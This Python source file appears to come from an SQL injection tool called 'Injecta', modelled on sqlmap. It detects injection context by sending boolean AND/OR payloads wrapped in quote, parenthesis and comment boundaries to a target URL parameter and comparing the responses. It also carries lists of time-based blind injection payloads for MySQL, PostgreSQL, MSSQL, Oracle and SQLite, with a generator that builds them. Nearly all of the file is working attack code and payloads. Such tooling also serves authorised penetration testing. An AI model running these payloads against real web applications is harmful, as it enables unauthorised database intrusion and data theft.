"""
Injecta — SQL injection context detection (boundary system)
Auto-detects quote style, parentheses, and comment syntax like sqlmap.
"""
import re
import statistics
from typing import List, Dict, Optional, Tuple


COMMENT_STYLES = [
    "-- -",
    "--",
    "#",
    "/*",
]

BOUNDARIES = [
    # (name, prefix, suffix, ptype)
    ("numeric",        "",      "-- -",  1),
    ("single-quote",   "'",     "-- -",  2),
    ("double-quote",   '"',     "-- -",  3),
    ("single-paren",   "')",    "-- -",  2),
    ("double-paren",   '")',    "-- -",  3),
    ("single-double-paren", "'))",  "-- -",  2),
    ("double-double-paren", '"))',  "-- -",  3),
    ("single-like",    "'",     " AND '1'='1", 2),
    ("double-like",    '"',     ' AND "1"="1', 3),
]


class Boundary:
    def __init__(self, name: str, prefix: str, suffix: str, ptype: int):
        self.name = name
        self.prefix = prefix
        self.suffix = suffix
        self.ptype = ptype

    def wrap(self, payload: str) -> str:
        return f"{self.prefix}{payload}{self.suffix}"

    def __repr__(self):
        return f"Boundary({self.name}: {repr(self.prefix)}...{repr(self.suffix)})"


class SQLContext:
    def __init__(self):
        self.boundary: Optional[Boundary] = None
        self.comment: str = "-- -"
        self.ptype: int = 1
        self.found: bool = False

    def is_ready(self) -> bool:
        return self.found and self.boundary is not None

    def wrap(self, payload: str) -> str:
        if self.boundary:
            return self.boundary.wrap(payload)
        return payload

    def detect(self, req, url: str, param: str, baseline_text: str = "",
               timeout: float = 10.0) -> bool:
        """sqlmap-style: try each boundary with AND true/false until a difference is found."""
        boundaries = [Boundary(*b) for b in BOUNDARIES]
        baselines = self._measure_baselines(req, url, param, count=2)

        for boundary in boundaries:
            true_payload = boundary.wrap(" AND 1=1")
            false_payload = boundary.wrap(" AND 1=2")

            try:
                _, true_text, true_time = req.test_raw(url, true_payload, param)
                _, false_text, false_time = req.test_raw(url, false_payload, param)
            except:
                continue

            if not true_text or not false_text:
                continue

            diff = self._detectable_difference(true_text, false_text, baseline_text)
            if diff:
                self.boundary = boundary
                self.ptype = boundary.ptype
                self.found = True
                return True

        # Fallback: try OR-based detection
        for boundary in boundaries:
            true_payload = boundary.wrap(" OR 1=1")
            false_payload = boundary.wrap(" OR 1=2")

            try:
                _, true_text, _ = req.test_raw(url, true_payload, param)
                _, false_text, _ = req.test_raw(url, false_payload, param)
            except:
                continue

            if not true_text or not false_text:
                continue

            diff = self._detectable_difference(true_text, false_text, baseline_text)
            if diff:
                self.boundary = boundary
                self.ptype = boundary.ptype
                self.found = True
                return True

        return False

    def _measure_baselines(self, req, url: str, param: str, count: int = 3) -> List[float]:
        times = []
        for _ in range(count):
            try:
                _, _, t = req.test_raw(url, "1", param)
                if t is not None:
                    times.append(t)
            except:
                continue
        return times

    def _detectable_difference(self, resp_a: str, resp_b: str, baseline: str = "") -> bool:
        len_diff = abs(len(resp_a) - len(resp_b))
        if len_diff > 10 and len_diff > len(resp_b) * 0.03:
            return True

        err_a = self._error_count(resp_a)
        err_b = self._error_count(resp_b)
        if abs(err_a - err_b) >= 1:
            return True

        return False

    def _error_count(self, text: str) -> int:
        kw = ["error", "warning", "syntax", "unexpected", "mysql", "ORA-", "MSSQL", "driver"]
        return sum(1 for k in kw if k.lower() in text.lower())

    def time_based_test(self, req, url: str, param: str, payload: str,
                        baseline_avg: float, baseline_std: float,
                        threshold: float = 2.0) -> Tuple[bool, float]:
        """sqlmap-style time-based injection test with statistical comparison."""
        try:
            _, _, resp_time = req.test_raw(url, payload, param)
        except:
            return False, 0

        if resp_time is None:
            return False, 0

        expected_delay = baseline_avg + baseline_std * 2 + threshold
        return resp_time >= expected_delay, resp_time


# DBMS-specific time payloads with boundaries
TIME_PAYLOADS = {
    "mysql": [
        " AND SLEEP(%d)",
        " OR SLEEP(%d)",
        " AND SLEEP(%d)-- -",
        " AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)",
        " AND BENCHMARK(5000000, MD5('x'))",
    ],
    "postgresql": [
        " AND pg_sleep(%d)",
        " OR pg_sleep(%d)",
        " AND pg_sleep(%d)--",
        " AND (SELECT COUNT(*) FROM pg_sleep(5))",
    ],
    "mssql": [
        "; WAITFOR DELAY '0:0:%d'",
        " AND WAITFOR DELAY '0:0:%d'",
        " OR WAITFOR DELAY '0:0:%d'",
        "; WAITFOR DELAY '0:0:%d'--",
    ],
    "oracle": [
        " AND DBMS_PIPE.RECEIVE_MESSAGE('x',%d)=1",
        " OR DBMS_PIPE.RECEIVE_MESSAGE('x',%d)=1",
        " AND (SELECT COUNT(*) FROM all_objects A, all_objects B)",
    ],
    "sqlite": [
        " AND randomblob(50000000)",
        " AND (SELECT COUNT(*) FROM pragma_database_list A, pragma_database_list B)",
    ],
}

DBMS_AGNOSTIC_TIME = [
    (" AND 1=1 AND SLEEP(%d)", "unknown"),
    ("' AND SLEEP(%d) AND '1'='1", "unknown"),
    ('" AND SLEEP(%d) AND "1"="1', "unknown"),
    (" AND 1=1 AND pg_sleep(%d)", "unknown"),
    ("' AND pg_sleep(%d)-- -", "unknown"),
    (" AND 1=1 AND WAITFOR DELAY '0:0:%d'", "unknown"),
    ("; WAITFOR DELAY '0:0:%d'--", "unknown"),
]


def generate_time_payloads(dbms_hint: str = "", delay: int = 5) -> List[str]:
    """Generate all time-based payload combinations for all DBMS."""
    payloads = []
    base_payloads = TIME_PAYLOADS.get(dbms_hint, []) if dbms_hint else []

    for template in base_payloads:
        if "%d" in template:
            payloads.append((template % delay, dbms_hint or "unknown"))
        else:
            payloads.append((template, dbms_hint or "unknown"))

    if not dbms_hint:
        for template, hint in DBMS_AGNOSTIC_TIME:
            if "%d" in template:
                payloads.append((template % delay, hint))
            else:
                payloads.append((template, hint))

    return payloads
